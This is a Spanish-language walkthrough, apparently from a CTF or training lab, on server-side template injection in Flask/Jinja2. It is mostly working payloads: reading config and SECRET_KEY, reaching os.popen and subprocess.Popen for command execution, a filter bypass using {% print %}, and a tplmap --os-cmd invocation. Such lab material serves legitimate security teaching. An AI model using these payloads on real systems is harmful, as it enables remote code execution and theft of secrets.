¿Qué es SSTI?

  1. Flask usa Jinja2 como motor de plantillas. Si el input del usuario se pasa directamente a render_template_string(), un atacante puede inyectar expresiones Jinja2.
  2. Easy: Sin filtro. Prueba con una expresión matemática para confirmar, luego ejecuta comandos del sistema: 
    {{ "{{" }} 7*7 {{ "}}" }}          → 49
{{ "{{" }} config {{ "}}" }}       → configuración Flask
{{ "{{" }} config.SECRET_KEY {{ "}}" }}

# RCE — leer la flag dedicada:
{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() {{ "}}" }}
  3. Medium: Bloquea {{ "{{" }} {{ "}}" }} pero permite {%25 %25}. Bypass: 
    {%25 print 7*7 %25}                    → 49
    {%25 print config %25}                 → configuración Flask
    {%25 print config.SECRET_KEY %25}

    # RCE — leer la flag:
    {%25 print config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() %25}
  4. Hard: Bloquea {{ "{{" }}, {%25, __class__, __mro__, __subclasses__, popen, etc. Usa herramientas automatizadas: 
    python3 tplmap.py -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"
  5. Escala al RCE (Easy) recorriendo la cadena de objetos Python: 
    {{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}
  6. Busca el índice de subprocess.Popen en la lista de subclases e inyecta comandos arbitrarios.
